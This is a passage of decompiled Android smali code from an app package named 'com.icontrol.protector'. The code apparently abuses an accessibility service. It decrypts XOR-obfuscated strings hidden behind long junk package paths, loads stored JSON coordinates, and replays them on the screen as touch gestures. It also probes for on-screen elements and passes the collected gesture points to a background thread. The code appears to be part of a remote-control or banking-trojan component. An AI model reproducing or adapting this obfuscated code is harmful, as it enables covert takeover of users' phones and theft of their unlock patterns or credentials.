    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const-string v3, ""

    invoke-static {v0, v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    sget-object p0, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    invoke-virtual {p0}, Ljava/util/LinkedList;->clear()V

    goto/16 :goto_1

    :cond_0
    const/16 v1, 0x1b

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    move v3, v1

    :goto_0
    array-length v4, v0

    if-ge v3, v4, :cond_1

    aget-object v4, v0, v3

    :try_start_0
    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5, v4}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    new-instance v4, Lcom/icontrol/protector/c$f;

    const/4 v6, 0x1

    new-array v7, v6, [B

    const/16 v8, 0x37

    aput-byte v8, v7, v1

    new-array v8, v2, [B

    fill-array-data v8, :array_4

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v7}, Lorg/json/JSONObject;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Ljava/lang/Float;->parseFloat(Ljava/lang/String;)F

    move-result v7

    new-array v6, v6, [B

    const/16 v8, -0x17

    aput-byte v8, v6, v1

    new-array v8, v2, [B

    fill-array-data v8, :array_5

    invoke-static {v6, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Lorg/json/JSONObject;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ljava/lang/Float;->parseFloat(Ljava/lang/String;)F

    move-result v6

    const/4 v8, 0x5

    new-array v8, v8, [B

    fill-array-data v8, :array_6

    new-array v9, v2, [B

    fill-array-data v9, :array_7

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v5, v8}, Lorg/json/JSONObject;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v7, v6, v5}, Lcom/icontrol/protector/c$f;-><init>(FFLjava/lang/String;)V

    invoke-virtual {p0, v4}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :catch_0
    move-exception p0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, p0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :cond_1
    sget-object v0, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->clear()V

    sget-object v0, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    invoke-virtual {v0, p0}, Ljava/util/LinkedList;->addAll(Ljava/util/Collection;)Z

    sget-object p0, Lcom/icontrol/protector/c;->h:Landroid/os/Handler;

    invoke-virtual {p0, v1}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    :goto_1
    return-void

    nop

    :array_0
    .array-data 1
        -0x11t
        -0x3ct
        -0x77t
    .end array-data

    :array_1
    .array-data 1
        -0x6at
        -0x4ft
        -0x20t
        -0x25t
        0x6et
        -0x76t
        -0x61t
        -0x3ct
    .end array-data

    :array_2
    .array-data 1
        0x76t
        -0x58t
        -0x3at
        0x7dt
        0x1ft
        0x22t
        -0x42t
        -0x47t
        0x76t
        -0x55t
        -0x27t
        0x7at
        0x1ct
        0x2ct
        -0x44t
        -0x53t
        0x23t
        -0x8t
        -0x80t
        0x28t
        0x4ct
        0x7bt
        -0x12t
        -0x1t
        0x27t
        -0xct
        -0x7bt
    .end array-data

    :array_3
    .array-data 1
        0x10t
        -0x34t
        -0x4bt
        0x11t
        0x74t
        0x48t
        -0x26t
        -0x36t
    .end array-data

    :array_4
    .array-data 1
        0x4ft
        -0x5ct
        0x66t
        0x24t
        -0x72t
        -0x3et
        -0x18t
        -0x7et
    .end array-data

    :array_5
    .array-data 1
        -0x70t
        0x3bt
        0x5dt
        0x7ct
        0x12t
        -0x40t
        0x65t
        0x79t
    .end array-data

    :array_6
    .array-data 1
        0x0t
        -0x37t
        -0x1bt
        0x76t
        -0x7bt
    .end array-data

    nop

    :array_7
    .array-data 1
        0x69t
        -0x59t
        -0x7ft
        0x13t
        -0x3t
        0x6bt
        -0x25t
        0x78t
    .end array-data
.end method

.method private static l(Lcom/icontrol/protector/AccessServices;)I
    .locals 3

    .line 1
    const/16 v0, 0x23

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v2, 0x1c

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {p0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz v0, :cond_0

    const/4 p0, 0x3

    return p0

    :cond_0
    if-eqz p0, :cond_1

    const/4 p0, 0x1

    return p0

    :cond_1
    const/4 p0, 0x2

    return p0

    :array_0
    .array-data 1
        0x1at
        0x2ft
        -0x31t
        0x2et
        -0x44t
        0x6bt
        0x3ft
        -0x65t
        0x16t
        0x29t
        -0x3at
        0x2et
        -0x52t
        0x7ct
        0x28t
        -0x63t
        0x1ct
        0x2dt
        -0x29t
        0x69t
        -0x19t
        0x6ct
        0x3ft
        -0x3at
        0x2ft
        0x29t
        -0x2ct
        0x6ft
        -0x73t
        0x6ct
        0x35t
        -0x7et
        0x1ct
        0x39t
        -0x6et
    .end array-data

    :array_1
    .array-data 1
        0x79t
        0x40t
        -0x5et
        0x0t
        -0x23t
        0x5t
        0x5bt
        -0x17t
    .end array-data

    :array_2
    .array-data 1
        -0x18t
        0x4ft
        -0xft
        0x4ft
        -0x60t
        -0x11t
        0x62t
        0x43t
        -0x1ct
        0x49t
        -0x8t
        0x4ft
        -0x4et
        -0x8t
        0x75t
        0x45t
        -0x12t
        0x4dt
        -0x17t
        0x8t
        -0x5t
        -0x18t
        0x62t
        0x1et
        -0x20t
        0x45t
        -0x1bt
        0x50t
    .end array-data

    :array_3
    .array-data 1
        -0x75t
        0x20t
        -0x64t
        0x61t
        -0x3ft
        -0x7ft
        0x6t
        0x31t
    .end array-data
.end method

.method private static m(Lcom/icontrol/protector/AccessServices;)V
    .locals 2

    .line 1
    const/4 v0, 0x0

    invoke-static {v0}, Lcom/icontrol/protector/a;->t(Landroid/content/Context;)V

    const/4 v0, 0x3

    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const-wide/16 v0, 0x320

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, p0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0
.end method

.method private static n(Landroid/graphics/Path;ILcom/icontrol/protector/AccessServices;)V
    .locals 8

    .line 1
    filled-new-array {p1}, [I

    move-result-object p1

    new-instance v0, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v0}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    new-instance v7, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v3, 0x0

    const-wide/16 v5, 0x320

    move-object v1, v7

    move-object v2, p0

    invoke-direct/range {v1 .. v6}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    invoke-virtual {v0, v7}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v0

    new-instance v1, Lcom/icontrol/protector/c$e;

    invoke-direct {v1, p1, p0, p2}, Lcom/icontrol/protector/c$e;-><init>([ILandroid/graphics/Path;Lcom/icontrol/protector/AccessServices;)V

    const/4 p0, 0x0

    invoke-virtual {p2, v0, v1, p0}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    return-void
.end method

.method private static o(Landroid/content/Context;)V
    .locals 3

    .line 1
    new-instance p0, Ljava/lang/StringBuffer;

    invoke-direct {p0}, Ljava/lang/StringBuffer;-><init>()V

    const/4 v0, 0x0

    :goto_0
    sget-object v1, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    invoke-virtual {v1}, Ljava/util/LinkedList;->size()I

    move-result v1

    if-ge v0, v1, :cond_1

    sget-object v1, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    invoke-virtual {v1, v0}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/icontrol/protector/c$f;

    invoke-virtual {v1}, Lcom/icontrol/protector/c$f;->a()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    sget-object v1, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    invoke-virtual {v1}, Ljava/util/LinkedList;->size()I

    move-result v1

    add-int/lit8 v1, v1, -0x1

    if-eq v0, v1, :cond_0

    const/16 v1, 0x1b

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    :cond_0
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_1
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/icontrol/protector/c$a;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/c$a;-><init>(Ljava/lang/StringBuffer;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void

    nop

    :array_0
    .array-data 1
        -0x36t
        0x69t
        0x38t
        -0x2t
        0x42t
        -0x7ct
        0x8t
        -0x48t
        -0x36t
        0x6at
        0x27t
        -0x7t
        0x41t
        -0x76t
        0xat
        -0x54t
        -0x61t
        0x39t
        0x7et
        -0x55t
        0x11t
        -0x23t
        0x58t
        -0x2t
        -0x65t
        0x35t
        0x7bt
    .end array-data

    :array_1
    .array-data 1
        -0x54t
        0xdt
        0x4bt
        -0x6et
        0x29t
        -0x12t
        0x6ct
        -0x35t
    .end array-data
.end method

.method public static p()V
    .locals 8

    .line 1
    sget-object v0, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/AbstractCollection;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    const/4 v0, 0x1

    sput-boolean v0, Lcom/icontrol/protector/c;->f:Z

    new-instance v2, Landroid/graphics/Path;

    invoke-direct {v2}, Landroid/graphics/Path;-><init>()V

    sget-object v1, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    const/4 v3, 0x0

    invoke-virtual {v1, v3}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/icontrol/protector/c$f;

    iget v1, v1, Lcom/icontrol/protector/c$f;->a:F

    sget-object v4, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    invoke-virtual {v4, v3}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lcom/icontrol/protector/c$f;

    iget v3, v3, Lcom/icontrol/protector/c$f;->b:F

    invoke-virtual {v2, v1, v3}, Landroid/graphics/Path;->moveTo(FF)V

    :goto_0
    sget-object v1, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    invoke-virtual {v1}, Ljava/util/LinkedList;->size()I

    move-result v1

    if-ge v0, v1, :cond_1

    sget-object v1, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    invoke-virtual {v1, v0}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/icontrol/protector/c$f;

    iget v1, v1, Lcom/icontrol/protector/c$f;->a:F

    sget-object v3, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    invoke-virtual {v3, v0}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lcom/icontrol/protector/c$f;

    iget v3, v3, Lcom/icontrol/protector/c$f;->b:F

    invoke-virtual {v2, v1, v3}, Landroid/graphics/Path;->lineTo(FF)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_1
    new-instance v0, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v0}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    new-instance v7, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v3, 0x0

    const-wide/16 v5, 0x320

    move-object v1, v7

    invoke-direct/range {v1 .. v6}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    invoke-virtual {v0, v7}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v0

    sget-object v1, Lcom/icontrol/protector/c;->a:Lcom/icontrol/protector/AccessServices;

    new-instance v2, Lcom/icontrol/protector/c$b;

    invoke-direct {v2}, Lcom/icontrol/protector/c$b;-><init>()V

    const/4 v3, 0x0

    invoke-virtual {v1, v0, v2, v3}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    return-void
.end method
